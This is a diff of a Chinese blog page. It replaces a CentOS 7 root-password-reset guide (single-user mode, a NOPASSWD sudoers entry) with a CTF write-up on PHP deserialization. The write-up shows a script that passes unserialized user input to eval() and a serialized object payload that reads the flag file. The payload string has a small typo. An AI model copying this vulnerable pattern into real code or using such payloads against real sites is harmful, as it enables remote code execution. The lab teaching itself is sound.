@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>CentOS7重置root密码 | 蹦蹦小圆帽の部落格</title>
+    <title>CTF之PHP反序列化1 | 蹦蹦小圆帽の部落格</title>
     <meta name="author" content="蹦蹦小圆帽" />
     <meta name="description" content="这个世界灿烂盛大！" />
     <meta name="keywords" content="blog" />
@@ -163,14 +163,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CentOS7重置root密码</h1>
+        <h1>CTF之PHP反序列化1</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/9/28
+            2025/11/19
         </span>
         
         
@@ -182,8 +182,29 @@
             
             <span class="tag">
                 
-                <a href="/tags/Linux/" style="color: #03a9f4">
-                    Linux
+                <a href="/tags/CTF/" style="color: #ff7d73">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Web/" style="color: #03a9f4">
+                    Web
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ffa2c4">
+                    渗透测试
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP/" style="color: #ff7d73">
+                    PHP
                 </a>
             </span>
             
@@ -192,68 +213,52 @@
     </div>
     
     <div class="content" v-pre>
-        <h1>CentOS 7 重置root密码</h1>
-<p>CentOS 7 安装过程中没有设置root密码、没有将新建的用户加入管理员组，导致无法使用su和sudo命令</p>
-<h2 id="解决思路">解决思路</h2>
-<p>进入single user mode设置root密码或将用户加入sudoers里面</p>
-<h2 id="解决步骤">解决步骤</h2>
-<ol>
-<li>
-<p>重启虚拟机，在GRUB引导页面按 <code>E</code> 键，进入编辑模式</p>
-</li>
-<li>
-<p>找到<code>linux</code>行，例如：</p>
-<pre><code>linux16 /vmlinuz-3.10.0-862.e17...
+        <h1>PHP反序列化1</h1>
+<h2 id="什么是序列化和反序列化">什么是序列化和反序列化</h2>
+<p>序列化是将对象转换成可存储的字节序列的过程</p>
+<p>反序列化是将字节序列恢复为对象</p>
+<p>当用户参数可控时，反序列化过程中会导致一些安全问题</p>
+<h2 id="题目">题目</h2>
+<p>序列化迷城 1：失落的神器</p>
+<p>铁柱是一位年轻的网络安全研究员，在整理已故教授的遗物时，他发现了一台古老的计算机和一段神秘的代码。这台计算机上运行着一个实验性的安全系统，教授曾用它来测试一种新的对象序列化技术。然而，系统中存在一个致命的漏洞，允许通过精心构造的序列化对象来执行任意代码。铁柱需要利用这个漏洞，激活系统中隐藏的&quot;神器&quot;程序，从而找到教授留下的第一个秘密。</p>
+<h2 id="解题步骤">解题步骤</h2>
+<p>打开页面看到</p>
+<pre><code class="language-php">
+&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class a&#123;
+    var $act;
+    function action()&#123;
+        eval($this-&gt;act);
+    &#125;
+&#125;
+$a=unserialize($_GET['flag']);
+$a-&gt;action();
+?&gt; 
 </code></pre>
-<p>在这一行的末尾（方向键移动到行尾，建议按<code>END</code>键定位到末尾，有些同学可能不知道行尾的意思</p>
-</li>
-<li>
-<p>添加以下内容（不需要另起一行！！）</p>
-<pre><code>rd.break console=tty0
+<p>在本题中，使用了<code>eval()</code>函数，该函数会把字符串作为代码执行，比如：</p>
+<pre><code class="language-php">&lt;?php
+    $cmd = &quot;system('calc')&quot;
+    eval($cmd)
+?&gt;
 </code></pre>
-<p>然后按<code>Ctrl+X</code>启动（进入单用户模式）</p>
-</li>
-<li>
-<p>以rw模式重新挂载/sysroot:</p>
-<pre><code>mount -o rw,remount /sysroot
+<p>就可以打开计算器</p>
+<p>题目中<code>highlight_file(__FILE__)</code>用于高亮显示代码文件，<code>error_reporting(0)</code>可以清空报错信息，因此我们可以构造payload：</p>
+<pre><code class="language-php">$a = new a();
+$a-&gt;act=&quot;highlight_file('flag.php');&quot;;
+echo serialize($a);
 </code></pre>
-</li>
-<li>
-<p>切换到/sysroot：</p>
-<pre><code>chroot /sysroot
+<p>即构建为：</p>
+<pre><code class="language-php">O:1:&quot;a&quot;:1:&#123;s:3:&quot;act&quot;;s:27;&quot;highlight_file('flag.php');&quot;;&#125;
 </code></pre>
-</li>
-<li>
-<p>标准输入修改root密码</p>
-<pre><code>echo '123456' | passwd --stdin root
+<p><code>O</code>代表是一个Object，类名长度为<code>1</code>，类名为<code>&quot;a&quot;</code>，对象包含<code>1</code>个属性，接下来是在<code>&#123;&#125;</code>中设置属性<code>s:3:&quot;act&quot;</code>其中<code>s</code>代表字符串，长度为<code>3</code>，属性名<code>&quot;act&quot;</code>；<code>s:27:&quot;highlight_file('flag.php');&quot;</code>，类型字符串<code>s</code>，长度<code>27</code>字节（引号中的部分）</p>
+<p>因此我们组合起来的意思就是：</p>
+<p>构造一个类<code>a</code>的对象，这个对象有一个属性<code>act</code>，值为<code>&quot;highlight_file('flag.php');&quot;</code></p>
+<p>此时PHP执行的语句就是：</p>
+<pre><code class="language-php">eval(&quot;highlight_file('flag.php');&quot;)
 </code></pre>
-<p>注意需要selinux处于disabled状态，如果不懂请参考方法2</p>
-</li>
-<li>
-<p>(方法2) 将当前用户添加到sudoers文件：</p>
-<pre><code>EDITOR=vim visudo
-</code></pre>
-<p>找到这一行：（可以通过直接输入<code>/Allow root to run</code>快速搜索）</p>
-<pre><code>root    ALL=(ALL)   ALL
-</code></pre>
-<p>在下面插入（按<code>i</code>进入插入模式）：</p>
-<pre><code>你的用户名  ALL=(ALL)   NOPASSWD:ALL
-</code></pre>
-<p>然后按<code>Esc</code>退出插入模式，按住<code>Ctrl</code>连续按两下<code>Z</code>保存退出</p>
-<p>输入<code>exit</code>退出chroot容器</p>
-<p>输入<code>reboot</code>重启</p>
-</li>
-<li>
-<p>(方法2) 修改root密码</p>
-<p>开机后登陆你的用户，打开终端，输入：</p>
-<pre><code>sudo su
-</code></pre>
-<p>进入root用户，然后输入</p>
-<pre><code>passwd root
-</code></pre>
-<p>输入你要设置的密码（输入两遍）即可重置root密码</p>
-</li>
-</ol>
+<p>从而得到flag</p>
 
     </div>
     
